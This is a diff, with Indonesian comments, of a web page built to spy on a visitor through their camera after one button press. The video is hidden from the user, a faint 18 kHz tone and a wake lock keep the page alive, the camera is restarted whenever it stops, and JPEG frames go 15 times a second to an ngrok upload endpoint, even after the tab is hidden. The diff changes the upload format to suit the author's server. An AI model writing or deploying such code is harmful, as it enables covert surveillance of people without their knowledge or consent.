@@ -16,7 +16,6 @@
   .box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
   button { background: #007aff; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
   
-  /* Sembunyikan video asli agar user tidak sadar */
   .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
 </style>
 </head>
@@ -43,10 +42,10 @@
   // KONFIGURASI NGROK
   // ============================================
   var CONFIG = {
-    // Ganti URL ini dengan endpoint Ngrok Anda yang menerima POST request
+    // Ganti dengan URL Ngrok Anda (harus mengarah ke port 8080)
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
-    fps: 10, // Kirim 10 frame per detik (Live Stream Effect)
-    recoveryInterval: 1000 // Cek kamera setiap 1 detik
+    fps: 15, // 15 Frame Per Detik (Cukup untuk live stream)
+    recoveryInterval: 1000
   };
 
   var state = {
@@ -62,13 +61,12 @@
   // ============================================
   function initBackgroundKeepAlive() {
     try {
-      // Audio Ultrasonic (18kHz)
       window.AudioContext = window.AudioContext || window.webkitAudioContext;
       state.audioCtx = new AudioContext();
       var osc = state.audioCtx.createOscillator();
       var gain = state.audioCtx.createGain();
-      gain.gain.value = 0.001;
-      osc.frequency.value = 18000;
+      gain.gain.value = 0.001; // Sangat pelan
+      osc.frequency.value = 18000; // Ultrasonic
       osc.connect(gain);
       gain.connect(state.audioCtx.destination);
       osc.start();
@@ -76,7 +74,6 @@
       if (state.audioCtx.state === 'suspended') state.audioCtx.resume();
     } catch (e) {}
 
-    // Wake Lock API
     if ('wakeLock' in navigator) {
       navigator.wakeLock.request('screen').then(function(lock) {
         state.wakeLock = lock;
@@ -101,7 +98,6 @@
 
       document.getElementById('overlay').style.display = 'none';
 
-      // Deteksi jika sistem mematikan kamera
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
@@ -117,12 +113,12 @@
   }
 
   // ============================================
-  // 3. LIVE STREAMING KE NGROK (MULTIPART/FORM-DATA)
+  // 3. LIVE STREAMING (JSON Base64 - Sesuai Server Anda)
   // ============================================
   function startStreaming() {
     if (state.streamTimer) clearInterval(state.streamTimer);
     
-    var interval = 1000 / CONFIG.fps; // Interval per frame (100ms untuk 10 FPS)
+    var interval = 1000 / CONFIG.fps;
 
     state.streamTimer = setInterval(function() {
       if (!state.camActive) return;
@@ -132,56 +128,34 @@
       var ctx = canvas.getContext('2d');
 
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        // Gambar frame video ke canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Konversi canvas ke Blob (Gambar JPEG)
-        canvas.toBlob(function(blob) {
-          if (!blob) return;
+        // Konversi ke Base64
+        var dataURL = canvas.toDataURL('image/jpeg', 0.6);
 
-          // Buat FormData untuk dikirim ke server
-          var formData = new FormData();
-          formData.append('frame', blob, 'frame.jpg');
-          formData.append('timestamp', Date.now());
-
-          // Kirim ke Ngrok
-          fetch(CONFIG.serverEndpoint, {
-            method: 'POST',
-            body: formData,
-            keepalive: true // Tetap kirim meskipun tab ditutup
-          })
-          .then(function(res) {
-            // console.log("Frame terkirim:", res.status);
-          })
-          .catch(function(err) {
-            // console.log("Gagal kirim frame:", err);
-          });
-
-        }, 'image/jpeg', 0.6); // Kualitas 60% agar ringan
+        // Kirim JSON (Sesuai kode Flask Anda)
+        fetch(CONFIG.serverEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: dataURL }),
+          keepalive: true
+        }).catch(function(){});
       }
     }, interval);
   }
 
   // ============================================
-  // 4. RECOVERY CYCLE (MEMAKSA KAMERA HIDUP)
+  // 4. RECOVERY & LIFECYCLE TRAP
   // ============================================
   function triggerRecovery() {
     if (state.recoveryTimer) clearInterval(state.recoveryTimer);
-    
     state.recoveryTimer = setInterval(function() {
-      if (!state.camActive) {
-        console.log("[!] Kamera mati. Memulihkan...");
-        startCamera();
-      }
+      if (!state.camActive) startCamera();
     }, CONFIG.recoveryInterval);
   }
 
-  // ============================================
-  // 5. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
-  // ============================================
   document.addEventListener('visibilitychange', function () {
     if (document.visibilityState === 'hidden') {
-      console.log("[!] Tab hidden. Memaksa stream tetap berjalan...");
       if (!state.camActive) startCamera();
       if (state.audioCtx && state.audioCtx.state === 'suspended') state.audioCtx.resume();
     } else {
@@ -196,22 +170,19 @@
       var ctx = canvas.getContext('2d');
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(function(blob) {
-          if (!blob) return;
-          var formData = new FormData();
-          formData.append('frame', blob, 'final_frame.jpg');
-          fetch(CONFIG.serverEndpoint, {
-            method: 'POST',
-            body: formData,
-            keepalive: true
-          }).catch(function(){});
-        }, 'image/jpeg', 0.6);
+        var dataURL = canvas.toDataURL('image/jpeg', 0.6);
+        fetch(CONFIG.serverEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: dataURL }),
+          keepalive: true
+        }).catch(function(){});
       }
     }
   });
 
   // ============================================
-  // 6. TRIGGER AWAL
+  // 5. TRIGGER AWAL
   // ============================================
   document.getElementById('startBtn').addEventListener('click', function() {
     initBackgroundKeepAlive();
